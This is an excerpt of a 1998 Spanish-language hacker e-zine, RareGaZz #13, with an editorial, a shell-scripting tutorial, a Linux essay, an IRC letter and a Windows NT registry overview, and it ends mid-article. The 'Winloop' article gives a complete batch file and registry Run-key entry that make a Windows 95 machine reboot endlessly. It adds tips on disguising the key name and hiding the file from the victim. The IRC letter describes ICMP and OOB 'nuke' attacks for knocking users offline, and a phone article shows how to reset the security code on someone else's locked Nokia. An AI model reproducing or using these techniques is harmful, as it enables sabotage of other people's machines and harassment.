

           ----------------------------------------------------
 A¤o 2/Numero 13                    ³                     Agosto de 1998
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
                                    ³       
           ----------------------------------------------------

   ooooooo       oo  ooooooo  oooooo     ooooo        oo   oooooo  oooooo
   $$""$$"    o$"$$  $$""$$"  $$       o$$""o,     o$"$$   """$$   """$$
   $$o$$"    $$  $$  $$o$$"   $$$$$$   $$    $$   $$  $$     $$      $$
   $$$$$    $$   $$  $$$$$    $$""""   "$o   $$  $$   $$    $$"     $$"
   $$" $$   $$$$$$$  $$" $$   $$        "$o  $$  $$$$$$$   o$"     o$"
   $$  "$$  $$   $$  $$  "$$  $$ooooo     "$o$$  $$   $$  o$$oooo o$$oooo
   ""   """ ""   ""  ""   """ """""""        ""  ""   ""  """"""" """""""

           ----------------------------------------------------
                                    ³
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
              "It's not a simple zine, it's a way of life"
           ----------------------------------------------------



                            Editor: Azumlord                     
                       Co-editores: Cytorax y Guybrush           
                    RareGaZz Team : Arkangel, Azumlord, Cytorax  
                                    Grovvy,  Guybrush, KillerBot 
                                    Mr.X, Orion, RareTrip,       
                                    ServerHacker y Vov_77.       
                   Agradecimientos: Yo_soy, 12r, Mr.Nexus, KH,   
                                    Cyberdan, Zorro, jabm y Hook 
          Distribuidores Oficiales: raregazz.islatortuga.com    
                                    raregazz.acapulco.uagro.mx   
                     E-mail Ofical: raregazz@iname.com
               Saludos (Oficiales): A mi papi y mami que me estan viendo,
                                    les prometo que pronto les pagar‚ el
                                    recibo telefonico.(Eso espero...)
           Frase del Dia (Oficial): RareGaZz, si funciona y funciona muy bien.
      Rayadas de Madre (Oficiales): Carlitos(CSG), pa que veas que si se te
                                    recuerda.
           Comentarios (Oficiales): Uh?.... que se pone aqui??.... mmm......



Ä[ E d i t o r i a l ]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ


 Ha  pasado  ya  un  buen tiempo desde que -=RareGaZz=- salio por ultima vez,
ahora <<::RareGaZz::>>  #13  representa la confirmacion de que el hacking en
Mexico  es  ya  una  realidad, con  grupos  como  X-Ploit, quienes hackearon
distintos  sistemas  gubernamentales, haciendo de la red  una forma de hacer
escuchar  las  voces  de los miles y miles de indigenas que son degradados y
explotados  dia a dia, por *politicos* que lo unico que buscan son intereses
economico$,  esos  *politicos* que manejan la informacion para hacerse pasar
por los *buenos*, y que lo unico que hacen es aplicar la *justicia*, ja....

 *JUSTICIA*???????,  para  ellos  que  es *justicia*??, es *justicia* a caso
asesinar  a  cientos  de  indigenas,  en los que se incluyen mujeres y ni¤os,
porque eran *REBELDES REVOLUCIONARIOS*?????, creo que no entendi el concepto
de *REBELDE REVOLUCIONARIO*,  porfavor  eran campesinos!!, que querian hacer
respetar  sus  *derechos*, con  mitings pacificos!!!; grupos como el EPR y el
EZLN, no descansaran hasta ver a *su* pueblo  vivir  en  verdadera *JUSTICIA*
y   que  sus  *DERECHOS*   sean   verdaderamente   respetados,   aunque  esto
signifique ir en contra de las leyes nacionales. 

 Mexico  no  es  el  unico  lugar  en  donde  los  *politicos*  creen  que la
sociedad  es  una  marioneta  que pueden  manejar a su antojo, el hacking es
ahora  *nuestra*  forma  de  decirles  que  nosotros no somos estupidos a los
que pueden enga¤ar.

 Y Mexico  tampoco  es el unico lugar en donde el hacking se expande y crece,
en toda ibeoramerica, Espa¤a, Chile, Colombia, Peru, Argentina, por mencionar
solo algunos, el hacking sigue adelante; para algunos el hacking es una forma
de expresarse y refugiarse de un mundo, que  simplemente  no  es apto para el
hacker, que quede bien claro lo que dije, -"un mundo no apto para el hacker"-,
puesto que el hacker es capaz de socializarse con  las personas de su entorno
como una persona normal, pero no se  siente  en  su  mundo,  en su ambiente y
escapa al unico mundo que es apto para el, Inet.



         ÚÄÄ[ C o n t e n i d o s ]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
       ÚÄ´                                                      ³
       ³ ³  +Editorial -----------------------> Azumlord        ³
       ³ ³  +Programacion en Shell I ---------> 12r             ³
       ³ ³  +El atake 'WINLOOP' --------------> Yo_Soy          ³
       ³ ³  +Programacion de los Nokia 638 ---> Zorro           ³
       ³ ³  +El Mundo GNU/Linux --------------> KH              ³
       ³ ³  +Texto de ayuda sobre el                            ³
       ³ ³   mundillo del IRC ----------------> Cyberdan        ³
       ³ ³  +Registro del NT -----------------> Cytorax         ³
       ³ ³  +Puertas Traseras ----------------> Azumlord        ³
       ³ ³  +Bombas, bombas! que pasa? -------> Mr. Nexus       ³
       ³ ³  +Como ejecutar aplicaciones                         ³
       ³ ³   desde Netscape(X version) -------> jabm            ³
       ³ ³  +Como Hackear desde Win95                           ³
       ³ ³   y desde Linux -------------------> Hook            ³
       ³ ³  +Comunicado de X-Ploit -----------> X-Ploit TEAM    ³
       ³ ³  +Cartas del Lector ---------------> Guybrush        ³
       ³ ³  +Noticias ------------------------> Guybrush        ³
       ³ ³  +Llaves PGP ----------------------> RareGaZz Staff  ³
       ³ ³  +Despedida -----------------------> Azumlord        ³
       ³ ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÙ
       ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ  

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

                        --------------------------------
                        ----PROGRAMACION EN SHELL I-----
                        ------------POR 12r-------------
                        -------12r@antisocial.com-------
                        --------------------------------

        Una herramienta muy importante en UNIX es la programacion en el 
Bourne Shell, mejor conocida como programacion en shell, es muy util
tanto para administrar el sistema como para la diversion ;-).

        El Bourne shell es un interprete de comandos desarrollado por
Stephen R. Bourne y recuerda mucho la sintaxis del lenguage Algol. es 
de 4 a 20 veces mas rapido que el C shell y muy poderoso.

        Los programas desarrollados en shell, suelen ser de distintos
niveles,desde los mas sencillos, hasta los mas complicados y elegantes.

Los pogramas en shell pueden ser escritos es cualquier editor como 
EMACS o VI y no es necesario guardarlos con una extension de archivo
especifica.

NOTA el simbolo '$' simboliza el prompt de UNIX.


        Empezemos con los ciclos que son una parte importante de la
pogramacion.



*EL CICLO FOR*

                #Este archivo se llama ej_for
                for name in hack the planet!
                do
                        echo $name
                done


                $ej_for
                hack
                the 
                planet!
                $

        Bueno, este pequeño programa nos da la oportunidad de explicar
varias cosas, empezemos:

El simbolo '#' se utiliza para hacer comentarios en los programas
y no son tomados en cuenta por el interprete de comandos, la palabra
'for' comienza el ciclo;'name' es el nombre de la variable,'in' asigna
cada cadena de caracteres ('hack','the','planet!') a 'name';'do' nos
ejecuta la instruccion 'echo', la cual imprime en pantalla el valor
de '$name'. Para ejecutar el programa solo tenemos que escribir su
nombre y por supuesto dar enter ;-)

La estructura general del ciclo FOR es la siguiente:

                FOR variable IN valores
                DO
                        comandos
                DONE


-Pasando Argumentos-
        Analicemos el siguente programa:

                #Este archivo se llama ej_arg
                for arg
                do
                        echo $arg
                done

                $ej_arg 1 2 3 4 5
                1
                2
                3
                4
                5
                $

El ciclo FOR toma los argumentos (1,2,...) y los asigna a la variable
arg, facil no? :-)



*PARAMETROS POSICIONALES*

        "Parametros posicionales" es el nombre que se la da a los items
en la lista de argumentos. El shell tiene diez variables (0 a 9),en las
cuales se asignan los argumentos dados en la linea de comando.

                #Este archivo se llama ej_arg1
                echo $0
                echo $1
                echo $2
                echo $3

                $ej_arg1 phucking bastards micro$oft ok
                phucking
                bastards
                micro$oft 
                $

Los parametros posicionales son 0,1,2,3, asi $1 es remplazado por el 
primer argumento en este caso "phucking", $2 por el segundo ("bastards")
y asi sucesivamente. El argumento $0 es especial ya que toma su valor
del nombre del programa ejecutado. Existen otras variables especiales
en shell cmo por ejemplo $#,el cual toma el numero de argumentos y $$
que toma del numero del process id del mismo shell.
 

*EL CICLO WHILE*

El ciclo While es similar el ciclo for excepto por como sale de ciclo,
este ciclo es usado comunmente con el comando test.
La estructura del ciclo es como sigue:
                
                WHILE TEST expression
                DO
                        comandos
                DONE

Un ejemplo:

                #Este archivo se llama ej_whi
                while test $# != 0
                do
                        echo printing $1
                        lp $1
                        shift
                done

                $ej_whi file.c file1.c file2.c
                printing file.c
                request-id is lasser-1442 (1 file)
                printing file1.c
                request-id is lasser-1443 (1 file)  
                printing file2.c
                request-id is lasser-1444 (1 file)  
                $

El comando "test" esta probando la variable, $#, el numero de argumentos.
Si la variable es diferente a cero se ejecuta el programa y en caso
contrario lo termina. 

Si no te gusta usar el comando test puedes sustiuirlo por "[]",
es decir:
                while test $# != 0 es igual a: while [ $# != 0 ]


Existen varios argumentos para el comado test que hacen mas eficiente
su uso.
Nota: "nombre" se refiere a nombre del archivo.
         
                -r nombre       verdadero si el archivo existe y se
                                puede leer. 
                -w nombre       verdadero si el archiivo existe y se
                                puede escribir.
                -f nombre       verdadero si el archivo existe y es 
                                un archivo regular.
                -d nombre       verdadero si el archivo existe y es
                                un directorio.
                -s nombre       verdadero si el archivo existe y su 
                                longitud es mayor a cero.
                -z s1           verdadero si la longitud de la cadena
                                s1 es cero.
                -n s1           verdadero si la longitud de la cadena
                                s1 es diferente a cero.
                s1 = s2         verdadero si la cadena s1 es igual a
                                la cadena s2.
                                
                s1 != s2        verdadero si la cadena s1 no es igual
                                a la cadena s2.

                s1              verdadero si la cadena s1 no es nula.

                -a              operador logico AND.
                
                -o              operador logico OR.             

Existen algunos mas argumentos pero estos son los mas usados, si
te interesa conocer mas busca en un manual de programacion en UNIX.


Por esta vez es sufieciente; en el proximo articulo tratare otros
aspectos de la programacion en shell. 

                         Sugerencias y comentarios: 12r@antisocial.com
                                                        F3l1ceZ h4ckZ!

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
                     El ATAKE 'WINLOOP' DENIAL-OF-SERVICE  
                    Como chingarte el Windows 95 por Yo_Soy 
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

El presente articulo nos muestra como hacer que un sistema corriendo Win 95
se reinicie una y otra vez. Este ataque es llamado "Winloop". Ha sido testeado
y funciona en las versiones originales de Windows 95, OSR2, y Memphis 1416.
(no ha sido probado en Windows 98, si alguien lo hace, avisar plz).

Para hacer esta madre, tienes que tener acceso fisico a la computadora y
ademas de eso, debes poder editar el registro del sistema.

Primeramente crea un archivo batch. Por ejemplo.
C:\WINDOWS\WINLOOP.BAT

No tiene que ser un archivo bat exclusivo, puede contener cualquier cosa en
el, pero debe contener las siguiente lineas:

---EMPIEZA ARCHIVO BATCH---
@ECHO OFF
BREAK OFF
ECHO
ECHO Computadora poseida por
ECHO Yo_Soy - VarF '98.
ECHO
ECHO Si quieres tener tu pc de
ECHO regreso arrodillate y reza
ECHO a Jesus para que perdone 
ECHO tus pecados.
ECHO
ECHO Winloop DOS Attack
ECHO RareGaZz E-Zine
---FIN DEL ARCHIVO BATCH---

Ese archivo de arriba es un simple ejemplo, porque podemos poner de mensaje
una cosa como "This computer is infected by 'tu_nick'" etc.

Ok. Ahora que has hecho esto, abre el Explorador de Windows y selecciona
el archivo batch que acabas de crear (en este caso WINLOOP.BAT). Despues
da un click derecho sobre este archivo y vete a la opcion de Propiedades.

Despues a la pesta¤a "Programa" y marca la casilla "Cerrar al salir".
Ahora presiona sobre la opcion "Avanzada" y selecciona la opcion "Modo MS-DOS"
ahora deberas desactivar la casilla "Avisar antes de entrar a modo MS-DOS ".
Dale click en OK. Otra vez a OK.

Con esto generamos un archivo con la extension .PIF del mismo nombre del
archivo batch que generaste y en el mismo directorio que tu archivo batch.

Abre ahora el registro de configuraciones del sistema
(C:\WINDOWS\REGEDIT.EXE)

Selecciona HKEY_LOCAL_MACHINE, SOFTWARE, Microsoft, Windows, CurrentVersion,
Run.  Crea una nueva cadena y ponle el nombre que quieras.  En nuestro ejemplo
se llamara "loop". Dale click derecho en "loop" y selecciona la modificar.
En el valor escribe "C:\WINDOWS\WINLOOP.PIF".  Y ya acabaste !!!

La proxima vez que enciendan la computadora, el Windows se va a reiciar
una y otra vez, una y otra vez, y otra ( creo que ya me entendiste, no ? ).
Las unicas maneras de librarte de este ataque es reinciar en modo A prueba de
fallos, borrar la entrada al registro; borrar el archivo .BAT o en su caso
el archivo .PIF . Y claro, reinstalar Windows. Como la llave que pusiste en
el registro se puede llamar como sea, ponle un nombre no sospechoso como
VXD.DLL o cualquier cosa (de todas maneras, quien se va a poner a revisar
completamente el pinche registro de windows).

Trata de colocar el archivo .BAT en un directorio mas o menos escondido o
en lugar donde no se vea sospechoso. Por ejemplo lo podemos poner en
/WINDOWS/PIF . Por supuesto, lo puedes poner donde se te de la gana...

Tal vez pienses, porque si tengo acceso fisico a la computadora y puedo
editar el registro de configuraciones, por que no borrar de una vez todo
el directorio de Windows o los archivos esenciales del sistema ?

La respuesta es sencilla, si te chingas el directorio es facil reconocer
el problema, y rapidamente procedes a re-instalar lo que tenias, pero el
Ataque DOS Winloop no es tan sencillo el determinar cual es la causa de que
no funcione correctamente el sistema. El usuario gastara horas de trabajo
intentando buscar una solucion al problema y cuando vea que en Modo A pueba
de fallos si funciona, buscara ayuda en otras personas, pedira ayuda al
servicio tecnico y ni modo, al final se rendira y acabara reinstalando
el Windows 95 de nuevo... Jajajajaja!!!

P.D --> Puedes usar un programa que te convierta el .bat a .com para que sea
mas difil de editar el archivo...    yo_soy_@hotmail.com


Original de Alatar (alatar@sekurity.org)

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

                     PROGRAMACION DE LOS NOKIA 638
                               por Zorro

En virtud de que aqui en Mexico ya casi todos pueden tener un celular me 
di a la tarea de ver como se programan los nokia 638, esta es la 
programacion rapida espero que pueda ser de utilidad, bueno empezemos, 
primero hay que poner la siguiente cadena en el telefono:

*#639#
Cuando pregunte el numero celular ponemos el telefono de la sig. manera:

52lllxxxxxx y send
Donde lll es la clave lada de la ciudad donde este el telefono p.ej:

En Mexico se programaria asi:
5256252525

y en Merida:
5299808080

Cabe mencionar que hay que estar seguro de la clave lada por que sino,
marca error, bueno depues de esto hay que poner el codigo del proveedor
de servicio del celular"CPSC"(este lo tienen que averiguar) y 4 000 p.ej.

CPSC+0000 ---> 246770000

Si quieren poner su telefono en ingles, frances o espa¤ol tienen que
poner:
           XXXX0000#0 si quieren el teclado en ingles
           XXXX0000#1 si quieren el teclado en frances
           XXXX0000#2 si quieren el teclado en espa¤ol

Ademas si tienes el telefono de alguien y esta bloqueado ( es decir la 
restriccion de solo entrante) entonces pones XXXX0000#0#1234 y el 1234
sera el nuevo codigo de seguridad, pero tienen que estar seguros del id
del servidor de servicio celular por que sino los manda ya saben por
donde.

Bueno por hoy me despido espero que esta informacion les sea de utilidad,
y si puedo mas adelante les mando informacion de como programa el erickson 
738, algun motorola, y otros tipos de celulares

-/-|-\-/-|-\-/-|-\-/-|-\-/-|-\-/-|-\-/-|-\-/-|-\-/-|-\-/-|-\-/-|-\-/-|-\-/-|-\
-\-|-/-\-|-/-\-|-/-\-|-/-\-|-/-\-|-/-\-|-/-\-|-/-\-|-/-\-|-/-\-|-/-\-|-/-\-|-/

                            EL MUNDO GNU/Linux
                          por KH(Crackers Brain)

 Lo primero, agradecer a Raregazz este espacio en su revista para poder
explicar detalladamente  eso que muchas de la veces, debo explicar a los
iniciados, en el IRC, sin posibilidad de extenderme.

 Bien, con este articulo, lo £nico que intentare, ser  intentar dar a
convencer a todos aquellos, a los que me veo obligado a llamar iniciados
(por no poseer, mas que el Windozer) a que se animen por el bien de ellos
mismos, a cambiar, o como m¡nimo, a compartir su actual sistema operativo,
con uno GNU.

 Animar a todos los lectores de Raregazz, especialmente a aquellos que
tienen poca o ninguna experiencia en el mundo GNU/Linux, a instalar en su
casa alguna de las versiones de GNU (expecialmente Linux). Probablemente
encontrar n el proceso muy largo y tedioso, especialmente en el momento de
elegir los paquetes de software que se quieran instalar en el disco duro.

 Con total seguridad, tendr n la impresi¢n de que hace falta ser un genio de
la inform tica para entender y manejar este sistema operativo.  Incluso se
preguntar n qu‚ razones pueden haber impulsado a nadie a construir y, por
otro lado, a utilizar, un sistema tan  rido y poco amigable. En esta peque¤a
introducci¢n en la revista pretendo dar respuesta a estas y otras preguntas.

La instalaci¢n de la cualquier distribuci¢n GNU, puede parecer un poco ardua
a los no iniciados, pero hay varias razones que simplifican notablemente la
labor. Una instalaci¢n dom‚stica t¡pica es un caso muy sencillo en el que el
trabajo de administraci¢n se reduce al m¡nimo.  Adem s, no hay que preocuparse
si, por ejemplo, no se entiende la utilidad de muchos de los paquetes que se
mostrar n para ser instalados.  En realidad, la primera instalaci¢n no tiene
por qu‚ ser ninguna maravilla, y no hay nada que no se pueda solucionar a
posteriori, cuando se tenga algo m s de experiencia.  En este sentido, una de
las mayores satisfacciones de GNU/Linux es que una vez que algo est  bien
instalado y funciona, entonces funcionar  SIEMPRE ( a diferencia de otros
sistemas operativos que no vale la pena ni mencionar): la impresora nunca
dejar  de imprimir, el m¢dem no se desconfigurar  solo, los programas no
dejar n de funcionar inesperadamente porque les falte una DLL que nunca
hab¡an necesitado antes, etc.(Os recuer da a algo?) :)

Sin embargo, los motivos m s importantes para adentrarse en el mundo GNU/Linux
son otros.  El primero es aprender inform tica.  Cualquier persona con una
m¡nima inquietud aprender  mil veces m s inform tica en un a¤o con un sistema
GNU que con cualquier otro sistema operativo propietario.  La explicaci¢n es
muy simple, y nos lleva al segundo, y primordial, motivo para usar GNU/Linux,
y es que GNU es un sistema abierto, libre.  Todos los aspectos del sistema
operativo son libres, para que el usuario pueda indagar en ellos, mirar el
c¢digo, hacer pruebas y, en definitiva, tener un conocimiento m s profundo
de c¢mo funciona todo. Tambi‚n cabe decir, que si alguno de vosotros quiere
llegar alg£n dia a hacer alguna "incursi¢n de importancia" debera conocer
los sistemas Unix.

 En otros sistemas, el programador se limita a realizar sus programas para un
compilador y con unas librer¡as propietarias y en un entorno de trabajo
tambi‚n propietario.  En ese caso, el conocimiento que tiene el programador
de las propias herramientas con las que trabaja es, en muchas ocasiones,
marginal.  Peor a£n, su experiencia, sus conocimientos y su trabajo est n
fuertemente ligados a la empresa concreta que vende las herramientas de
trabajo de las cuales depende.

Desde que instal‚ por primera vez una distribuci¢n GNU en un ordenador, hace
unos pocos a¤os, hasta la distribuci¢n £ltima de Red Hat 5.0 (que me parece
que es la £ltima), he sido testigo del desarrollo vertiginoso del sistema GNU.

 Existen evidencias para creer que nos encontramos, una vez m s, al borde de
un salto cualitativo importante en el desarrollo del sistema GNU.  Me estoy
refiriendo al desarrollo de proyectos como gtk y gnome, que proporcionar n un
entorno de trabajo y una interfaz homog‚nea a muchas de las aplicaciones de
GNU.

Hace tiempo que el proyecto GNU dej¢ de ser una utop¡a de un hacker del
Laboratorio de Inteligencia Artificial del Instituto Tecnol¢gico de
Massachusetts. Hoy en d¡a, miles de personas de todo el mundo est n
involucradas a trav‚s de la red en el desarrollo y prueba de las aplicaciones
que conforman el proyecto GNU (como el kernel linux).  Todo este esfuerzo
cooperativo, casi siempre desinteresado, ha conseguido multiplicar el n£mero
de aplicaciones libres y elevar su calidad a niveles notablemente superiores
a la gran mayor¡a del software propietario comercial.  El kernel Linux, por
ejemplo, es mucho m s estable, robusto y fiable que el sistema operativo de
ventanas n£mero uno en ventas por todos conocido(como he dicho antes no vale
la pena ni mencionarlo).  Buena prueba de ello es que GNU/Linux ya se ha
utilizado con ‚xito en aplicaciones cr¡ticas en muchos  mbitos de la industria.

El sistema GNU, incluso, es superior en muchos aspectos a los sistemas Unix
propietarios (de esos que valen una cifra con muchos ceros) con los que he
tenido la oportunidad de cruzarme a lo largo de mi carrera como "hacker".

 Es completamente err¢nea la impresi¢n generalizada de que el software libre
es de peor calidad que el propietario.

Concluyo ya intentando apuntalar, la idea de que el GNU, es el unico sistema
operativo que realmente vale la pena instalar. Una vez mas repito que, sin
animos de ofender ni de "darmelas" de superentendido, no llegreis a nada sin
el conocimiento sobre este tipo de sistemas operativos.

Un saludo.

KH (Crackers Brain).


-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

                Texto de ayuda sobre el mundillo del IRC
                ----------------------------------------


La verdad es que hace poco que conozco vuestra revista, y no he tenido tiempo 
de leerme todos los numeros. El tema que mejor domino es el IRC, aunque 
tampoco me considero un experto (pero se hace lo k se puede). Me llamo mucho 
la atencion el articulo de "Lobo" en el numero 11 de la revista. Para empezar 
voy a nombraros algunos servidores mas, que creo que os pueden ser utiles:

orion.irc-hispano.org   --- recomendable puerto 6664 (es el k yo uso)
pleyades.irc-hispano.org
pulsar.irc-hispano.org --- Poco recomendable, ya que esta en todos los split 
                           (siempre es él el afectado)
aire.irc-hispano.org
titan.irc-hispano.org

Y una lista enorme de ellos, que es demasiado grande para ponerla aki. La 
verdad es que no llevo mucho tiempo en Internet. Apenas llevo un año, pero 
creo que lo aproveche bien. Para empezar, no creo que el script "Azezino" que 
tanto anunciaba Lobo sea tan bueno. Yo lo probe, lo destripe y le mire de 
todo, pero no es gran cosa. En cambio, el Killer Zombie ya es otra cosa...
aunque a mi tampoco me gusta mucho. Yo llevo usando el IRcap desde la version 
3.0, y me parece el mejor en cuanto a war. Sin contar con sus protecciones y 
demas cosas (scans y otras utilidades). Tambien es muy bueno el ooßeé. Tiene 
un presentacion grafica excelente, sin contar con todas sus utilidades, 
scans, nukes, etc...Pero no se puede hablar del script perfecto, porque sobre 
gustos no hay nada escrito, y ademas, todavia no salio la version 3.0 del 
Sh@rk. Tambien es bueno El_BruJo, aunque este ya esta un poco pasado.

Otra de las cosas en las que no estoy de acuerdo con Lobo, es en lo del DNS. 
Probe eso un monton de veces, y no solo yo, sino tambien otra persona 
}^KHAN^{, con mucha experiencia en el irc y no funcionada.  
	
En cuanto a los puertos del nuke, Lobo decia que los puertos son el 139, el 
113 y otros mas. Esos otros son algunos como el 135, para el WindowsNT, el 
137, para el windows3.11.  Pero de todas formas, esto se refiere a un ataque 
de tipo OOB, que funciona enviando paquetes con ese dato (out of band) y como 
windows no sabe manejarlo, se culega. Pero actualmente es muy dificil obtener 
resultados satisfactorios pues casi todo el mundo tiene ese bug parcheado. 
Pero sobre el parche y como hacerlo ya hablo Lobo (en eso si estoy de acuerdo).

El nuke mas efectivo actualmente (bajo windows, claro) es el nuke ICMP. 
Antes de explicarlo es recomendable hablar un poco del TCP/IP. Como todos 
sabemos, la conexion entre un cliente y un servidor se hace mediante el 
protocolo TCP/IP. La ip es como nuestra direccion, y se encarga de enviar 
datos al server indicandole nuestro estado actual. Cuando un IP envia datos 
erroneos, el server la desconecta, dando el mensaje "Read error.....". La 
manera de aprovechar esto en nuestro beneficio, es anviando datos erroneos 
a la IP de nuestra victima, para que el servidor crea que esta mal y la 
desconecte. Esto se consigue con unos programillas muy chulos que hay ahora, 
tipo "click". Una buena formsa de evitar que esto nos lo hagan a nosotros es 
usando un firewall, que actua como cortafuegos de todos los paquetes ICMP que 
no interesan, por lo que hay que tenerlo bien configurado o de lo contrario 
tampoco nos llegaran datos necesarios. Este cortafuegos lo puedes conseguir 
en  "http://www.signal9.com". 

Bueno, creo que ya no tengo mas que decir. Me parece ya es bastante por ahora. 
Por cierto Lobo, ya te vere en #sin_nombre. Cuídate

Enhorabuena por la revista :)) 

CyberDan


                     \        /                     
     Por: Cytorax    \    ®   REGISTRO DE NT   ¯    / Cytorax@BigFoot.com 
                     \        /                     

                     http://members.xoom.com/cytorax/                     
                    http://members.tripod.com/~cytorax/                   


 INTRO
   Hola de nuevo amigos de RareGaZz, espero que ‚ste art¡culo les guste, est 
un poco corto ya que he tenido un poco de problemas, pero en fin, y ya
que se est  poniendo de moda el NT, debido a que de los Windows el m s
"seguro" y que se colisiona menos es el NT, decid¡ por hacer el art¡culo de el
registro de este OS, es importante que conozcas lo que es el registro, que
contiene, como usarlo, etc.. (manejando esto puedes tener el control del OS)

 DEFINICION
   El registro es como una base de datos segura, donde se mantiene toda la
info del sistema, de Software y de Hardware. Antes de esto se usaba (y se
usa a£n) que las configuraciones del sistema se guardaran en el WIN.INI,
SYSTEM.INI, etc. que eran solamente archivos de texto, ahora se usa el
registro, donde cada configuraci¢n del sistema se deposita all¡ por asi
decirlo.
   La ventaja de usar el registro, es que contiene Llaves (keys) y a su vez
pueden almacenar Sub-llaves (subkeys), estas sub-llaves almacenan detalles
y una amplia configuraci¢n de informaci¢n pa ra el OS. Estas pueden almacenar
c¢digo ejecutable, informaci¢n para varios usuarios, configuraci¢n de
programas, Licencias de productos =D , etc.

 PROGRAMAS PARA ACCEDER AL REGISTRO
   Para poder ver el registro del necesitas usar un editor de registro, con
sus dos versiones:
regedt32.exe ---> Este es el m s completo.
regedit.exe ---> Y ‚ste por si deseas buscar algo en especial.

 LLAVES DEL REGISTRO
HKEY_CURRENT_USER ---> Contiene la informaci¢n y la configuraci¢n del usuario
                       que est  en la manejando la PC, que es muy conocida
                       tambi‚n como el Perfil.
HKEY_USERS ---> Es donde se encuentran los Perfiles de los usuarios.

   El perfil del usuario esta guardado en los archivos NtUser.dat y
NtUser.dat.log asi como en las siguientes sub-llaves:
-Application Data: Donde la aplicaci¢n guarda informaci¢n acerca del usuario.
-Desktop: Maneja los iconos, accesos directos, etc. del usuario.
-Favorites: Guarda archivos y otras cosas del usuario.
-NetHood: Guarda la lista de las conecciones.
-Personal: Mantiene los archivos de un usuario en particular.
-PrintHood: Igual que NetHood pero con impresoras.
-Recent: Tiene los archivos usados recientemente.
-SendTo: "Enviar A" Son lo lugares a donde se desea enviar informaci¢n.
-Start Menu: Tiene los accesos directos a los programas de usuario.
-Templates: Como su nombre lo indica guarda los Templates del usuario.

HKEY_LOCAL_MACHINE ---> Tiene la informaci¢n de la configuraci¢n de la
                        computadora.

HKEY_LOCAL_MACHINE ---> Es la llave m s importante del registro y contiene
                        cinco sub-llaves:
-Hardware: Es una "peque¤a" base de datos que contiene el hardware de la
           computadora, asi como los drivers que usan estos.
-SAM: Este cuyas siglas significan (Security Accounts Manager), contiene la
      informaci¢n del usuario y el grupo, asi como las cuentas del dominio.
-Security: Contiene los derechos del cada usuario.
-Software: Es una base de datos que contiene informaci¢n del Software
           instalado en la computadora.
-System: Otra base de datos que controla el encendido del la PC, el cargado
         de drivers, servicios, etc.

 QUE SON LOS "HIVES"
   el registro est  dividido en partes llamadas hives, que se encuentran en
un archivo .LOG.


 Hive                                    Nombre de archivo                 

 HKEY_LOCAL_MACHINE\SAM                  SAM y SAM.LOG                     
 HKEY_LOCAL_MACHINE\SECURITY             Security y Security.LOG           
 HKEY_LOCAL_MACHINE\SOFTWARE             Software y Software.LOG           
 HKEY_LOCAL_MACHINE\SYSTEM               System y System.ALT               


 Y POR ULTIMO UNAS DEFINICIONES
-Ownership: Es menu que permite al propietario que otro usuario lo use.
-Regini.exe: Es una interfaz en donde tu puedes agregar una llave.

   Enseguida las propiedades de cada usuario en el registro:

\\ ---> Llave
\ ---> Sub-llave

\\HKEY_LOCAL_MACHINE
                Admin-Control Total
                Everyone-Solo Leer
                System-Control Total
 \HARDWARE
                Admin-Control Total
                Everyone-Solo Leer
                System-Control Total
 \SAM
                Admin-Control Total
                Everyone-Solo Leer
                System-Control Total
 \SECURITY
                Admin-Especial (Escribir DAC, Solo Leer)
                System-Control Total
 \SOFTWARE
                Admin-Control Total
                Creator Owner-Control Total
                Everyone-Especial (Crear, Enumerar, Notificar, Borrar, Leer)
                System-Control Total
 \SYSTEM
                Admin-Especial (Crear, Enumerar, Notificar, Borrar, Leer)
                Everyone-Solo Leer
                System-Control Total

\\HKEY_CURRENT_USER
                Admin-Control Total
                Current User-Control Total
                System-Control Total

\\HKEY_USERS
                Admin-Control Total
                Current User-Control Total
                System-Control Total

\\HKET_CLASSES_ROOT
                Admin-Control Total
                Creator Owner-Control Total
                Everyone-Especial (Crear, Enumerar, Notificar, Borrar, Leer)
                System-Control Total

\\HKEY_CURRENT CONFIG
                Admin-Control Total
                Creator Owner-Control Total
                Everyone-Solo Leer
                System-Control Total

 DESPEDIDA
   En este art¡culo manej‚ lo que contiene el NT por default, las llaves y
sub-llaves que encuentres en tu PC, no te sorprendas por la cantidad, y no te
detengas ya que existen muchas posibilidades, como poner mensajes molesos,
darte propiedades, cambiar los mensajes del Logon, hacer bromas o entretenerte
un buen rato, etc. solo depende de tu imaginaci¢n. A y por £ltimo saludos a
todos los amigos que nos escriben del los diferentes paises como: Chile,
